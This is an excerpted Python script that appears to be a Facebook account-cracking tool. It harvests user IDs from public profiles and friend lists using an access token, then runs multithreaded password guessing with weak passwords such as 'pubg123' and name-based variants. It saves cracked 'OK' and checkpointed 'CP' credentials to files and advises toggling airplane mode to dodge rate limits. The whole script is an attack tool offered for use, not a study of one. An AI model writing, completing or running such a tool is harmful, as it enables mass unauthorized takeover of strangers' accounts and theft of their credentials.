...
try:
	...
	try:
		...
		exit('please wait (pip install rich)')
...
p = '\x1b[0;34m' # BIRU +
# Converter Bulan
dic = {'1':'Januari','2':'Februari','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Augst','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'Januari','02':'Februari','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Augst','09':'September','10':'October','11':'November','12':'December'}
...
def login_lagi():
	...
	try:
		...
		sue = '# LOGIN SUCCESS, RUN AGAIN!'
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		login()
	except KeyError:
		sue = '# TRY AGAIN WITH STRONG TOKEN !'
		...
		if len(vin)==0:
			...
			for isi in vin:
				...
				if cih<100:
					...
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Acount'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Acount'+x)
			gerr2 = '# SELECT RESULTS TO DISPLAY'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] Choose : ')
			try:geh = lol[geeh]
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'•'+x+'] TYPE ME IF YOU WANT DUMP TOKEN ID FRIENDS')
	pil = input(x+'['+p+'f'+x+'] PUBLIC ID LINK : ')
	try:
		...
		teks = '# IF YOUR ID IS PUBLIC TRY AGAIN WITH STRONG TOKEN'
...
# DUMP ID MASSAL
def dump_massal():
	win = '# DUMP MILTI PUBLIC ID'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] ENtER LIMT IDZ')
	try:
		jum = int(input(x+'['+p+'f'+x+'] LiMit : '))
	except ValueError:
		pesan = '# tRY AGAIN'
	...
	yz = 0
	print(x+'['+h+'•'+x+'] TYPE ME IF DUMP TOKEN FRIEND LIST')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] iD LINK '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def setting():
	...
	teks = '[01] CRACK FROM OLDEST IDZ (TRY FOR OLD IDZ)\n[02] CRACK FROM NEW IDZ (TRY FOR NEW IDZ)\n[03] CRACK RENDOM IDZ (Recommended)'
	...
	if aplik in ['y','Y']:
		...
		taplikasi.append('no')
	osk = input(x+'['+p+'f'+x+'] Show Checkpoint Options? [ Not Recommended ] (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
def passwrd():
	...
	krek = 'OK IDZ SAVED : OK/%s\nCP IDZ SAVED : CP/%s\nTurn Airplane Mode On/Off Every 5 Minutes'%(okc,cpc)
	cetak(nel(krek, title='CRACK'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['pubg123','pubgking','king123','pubg1234','pubg786','king786','pubg12345']
			if len(nmf)<6:
				pwv.append(frs+'1234')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s[[NASEER]] %s/%s SOLO-OK =%s SOLO-CP =%s [WORKING...] %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					name = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					...
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						...
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Active Apps Yang Terkait *\n")
						else:
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s[[NASEER]] %s/%s SOLO-OK =%s SOLO-CP =%s [NASEER] %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%stry to open %s|%s SOLO-CP       '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAA" in resp.text:
				print('\r%sOPEN NOW %s|%s SOLO-OK       '%(h,idf,pw))
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%stry to open %s|%s SOLO-CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		...
		print('\r%stry to open %s|%s SOLO-CP       %s'%(b,idf,pw,x))
		print('\r%s---> Cannot Check Options (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
...
def cek_opsi():
	c = len(akun)
	hu = 'turn on aropln mode just for 5 secs'%(c)
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%stry to open %s|%s SOLO-CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
				...
				print('\r%sOPEN NOW %s|%s SOLO-OK       %s'%(h,id,pw,x))
			else:
				print('\r%stry to open %s|%s Uff Not       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# PROBLEM INTERNET CONNECTION, CHECK & TRY AGAIN'
